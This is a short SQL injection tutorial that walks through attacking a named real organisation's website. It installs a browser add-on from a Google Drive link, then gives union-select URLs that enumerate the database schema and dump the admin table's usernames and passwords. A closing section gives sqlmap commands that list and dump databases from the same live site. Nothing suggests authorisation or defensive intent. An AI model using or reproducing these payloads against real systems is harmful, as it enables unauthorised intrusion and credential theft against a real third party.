➢Application Bypass Attack Detection Web
1.First of all, you have to download Cyberfox Browser using this link https://cyberfox.en.softonic.com/
2.Then download this file https://drive.google.com/file/d/1ZutKbN53P8-fBQLuqNk8sDJ5OaSzIUE8/view
and import in cyberfox
for that open add-on function, then select extension and install add-on from file and choose fox file 
which you downloaded using this link https://drive.google.com/file/d/1ZutKbN53P8-
fBQLuqNk8sDJ5OaSzIUE8/view and import in cyberfox
3.open this link https://www.burobd.org/buro-emergency-disaster-response.php?id=25 in cyberfor and 
execute this query https://www.burobd.org/buro-emergency-disaster-response.php?id=25'
4. https://www.burobd.org/buro-emergency-disaster-response.php?id=25' order by 1,2,3,4,5,6,7,8--+
5. https://www.burobd.org/buro-emergency-disaster-response.php?id=-25' union select all 
1,2,3,4,5,6,7,8--+
6. https://www.burobd.org/buro-emergency-disaster-response.php?id=-25' union select all 
1,(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEM
A.SCHEMATA),3,4,5,6,7,8--+
7. https://www.burobd.org/buro-emergency-disaster-response.php?id=-25' union select all 
1,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.
TABLES+WHERE+TABLE_SCHEMA=DATABASE()),3,4,5,6,7,8--+
8. https://www.burobd.org/buro-emergency-disaster-response.php?id=-25' union select all 
1,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEM
A.COLUMNS+WHERE+TABLE_NAME=0x61646d696e),3,4,5,6,7,8--+ 9. https://www.burobd.org/buro-emergency-disaster-response.php?id=-25' union select all 
1,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+admin),3,4,5,6,7,
8--+➢Manual SQL-I Attack Detection
➢ In manual sql attack you have to run all queries in kali linux. Open command terminal and follow
this setps.
Step (1)
sqlmap -u https://www.burobd.org/buro-emergency-disaster- response.php?id=25 –dbs
Step (2)
sqlmap -u https://www.burobd.org/buro-emergency-disaster-response.php?id=25 --dbs --
tables -D information_schema
Step (3) sqlmap -u https://www.burobd.org/buro-emergency-disaster-response.php?id=25 --dump 
-D information_schema -T USER_
